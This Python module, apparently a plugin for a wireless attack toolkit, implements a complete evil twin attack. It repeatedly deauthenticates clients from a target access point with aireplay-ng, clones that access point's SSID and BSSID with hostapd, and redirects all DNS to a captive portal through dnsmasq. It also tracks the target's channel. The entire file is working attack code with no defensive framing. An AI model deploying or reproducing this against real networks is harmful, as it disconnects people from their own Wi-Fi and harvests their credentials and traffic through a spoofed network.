import subprocess
import os
import time
import logging
import threading
import tempfile

from logger import Logger

logger = Logger(name="evil_clone.py", level=logging.DEBUG)
b_class = "EvilClone"
b_module = "evil_clone"
b_status = "evil_clone"
b_port = 0
HOSTAPD_BIN = "hostapd"
DNSMASQ_BIN = "dnsmasq"


class EvilClone:
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.deauth_if = ""
        self.clone_if = ""
        self.target_bssid = ""
        self.target_ssid = ""
        self.target_channel = 6
        self.password = ""
        self.portal = "generic.html"
        self.running = False
        self._deauth_thread = None
        self._sync_thread = None
        self._hostapd_proc = None
        self._dnsmasq_proc = None
        self._captive_portal = None
        self._stop_flag = threading.Event()

    def _run_cmd(self, cmd, timeout=10):
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return proc.returncode, proc.stdout.strip(), proc.stderr.strip()
        except subprocess.TimeoutExpired:
            return -1, "", "timeout"
        except Exception as e:
            return -1, "", str(e)

    def _deauth_loop(self):
        while not self._stop_flag.is_set():
            self._run_cmd([
                "sudo", "aireplay-ng", "-0", "5", "-a",
                self.target_bssid, self.deauth_if
            ], timeout=15)
            self._stop_flag.wait(2)

    def _sync_channel(self):
        while not self._stop_flag.is_set():
            rc, out, err = self._run_cmd(
                ["sudo", "iw", "dev", self.deauth_if, "info"], timeout=3
            )
            for line in out.split("\n"):
                if "channel" in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        try:
                            ch = int(parts[1])
                            if ch != self.target_channel:
                                self.target_channel = ch
                                self._run_cmd([
                                    "sudo", "iw", "dev", self.clone_if,
                                    "set", "channel", str(ch)
                                ], timeout=3)
                        except ValueError:
                            pass
                    break
            self._stop_flag.wait(1)

    def start(self, deauth_if, clone_if, target_bssid, target_ssid,
              target_channel=6, password="", portal="generic.html",
              captive_portal=None):
        self.deauth_if = deauth_if
        self.clone_if = clone_if
        self.target_bssid = target_bssid
        self.target_ssid = target_ssid
        self.target_channel = target_channel
        self.password = password
        self.portal = portal
        self._captive_portal = captive_portal
        self._stop_flag.clear()

        self._run_cmd(["sudo", "airmon-ng", "start", deauth_if], timeout=10)

        self._run_cmd(["sudo", "iw", "dev", clone_if, "set", "channel", str(target_channel)], timeout=3)

        hostapd_conf = os.path.join(tempfile.gettempdir(), f"hostapd_clone_{int(time.time())}.conf")
        with open(hostapd_conf, "w") as f:
            if password:
                f.write(f"""interface={clone_if}
driver=nl80211
ssid={target_ssid}
bssid={target_bssid}
channel={target_channel}
hw_mode=g
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase={password}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
""")
            else:
                f.write(f"""interface={clone_if}
driver=nl80211
ssid={target_ssid}
bssid={target_bssid}
channel={target_channel}
hw_mode=g
ignore_broadcast_ssid=0
""")

        self._hostapd_proc = subprocess.Popen(
            ["sudo", HOSTAPD_BIN, hostapd_conf],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        time.sleep(1)

        dnsmasq_conf = os.path.join(tempfile.gettempdir(), f"dnsmasq_clone_{int(time.time())}.conf")
        with open(dnsmasq_conf, "w") as f:
            f.write(f"""interface={clone_if}
dhcp-range=192.168.5.2,192.168.5.100,255.255.255.0,12h
dhcp-option=3,192.168.5.1
dhcp-option=6,192.168.5.1
address=/#/192.168.5.1
no-resolv
log-queries
log-dhcp
""")

        self._dnsmasq_proc = subprocess.Popen(
            ["sudo", DNSMASQ_BIN, "-C", dnsmasq_conf, "--no-daemon"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        time.sleep(1)

        self._run_cmd(["sudo", "ifconfig", clone_if, "192.168.5.1", "netmask", "255.255.255.0"], timeout=5)
        self._run_cmd(["sudo", "ifconfig", clone_if, "up"], timeout=3)

        if captive_portal:
            captive_portal.start(
                port=80, portal_template=portal,
                wpa_validate_enabled=False, wpa_interface="",
                wpa_validator=None, loot_monitor=None,
                ssid=target_ssid, evil_ap_instance=None
            )

        self._deauth_thread = threading.Thread(target=self._deauth_loop, daemon=True)
        self._deauth_thread.start()

        self._sync_thread = threading.Thread(target=self._sync_channel, daemon=True)
        self._sync_thread.start()

        self.running = True
        logger.info(f"Evil Twin started: {target_ssid} ({target_bssid}) on {clone_if}, deauth on {deauth_if}")
        return True

    def stop(self):
        self._stop_flag.set()
        self.running = False

        if self._captive_portal:
            self._captive_portal.stop()

        if self._dnsmasq_proc:
            self._dnsmasq_proc.terminate()
            try:
                self._dnsmasq_proc.wait(timeout=5)
            except Exception:
                self._dnsmasq_proc.kill()
            self._dnsmasq_proc = None

        if self._hostapd_proc:
            self._hostapd_proc.terminate()
            try:
                self._hostapd_proc.wait(timeout=5)
            except Exception:
                self._hostapd_proc.kill()
            self._hostapd_proc = None

        self._run_cmd(["sudo", "pkill", "-f", "hostapd_clone"], timeout=3)
        self._run_cmd(["sudo", "pkill", "-f", "dnsmasq_clone"], timeout=3)

        self._run_cmd(["sudo", "airmon-ng", "stop", self.deauth_if], timeout=10)
        self._run_cmd(["sudo", "ifconfig", self.clone_if, "down"], timeout=3)

        logger.info("Evil Twin stopped")

    def restart(self):
        self.stop()
        time.sleep(2)
        self.start(
            self.deauth_if, self.clone_if, self.target_bssid,
            self.target_ssid, self.target_channel, self.password,
            self.portal, self._captive_portal
        )

    def get_status(self):
        return {
            "running": self.running,
            "deauth_if": self.deauth_if,
            "clone_if": self.clone_if,
            "target_ssid": self.target_ssid,
            "target_bssid": self.target_bssid,
            "target_channel": self.target_channel
        }

    def execute(self, ip="", port="", row=None, status_key=""):
        return 'success'
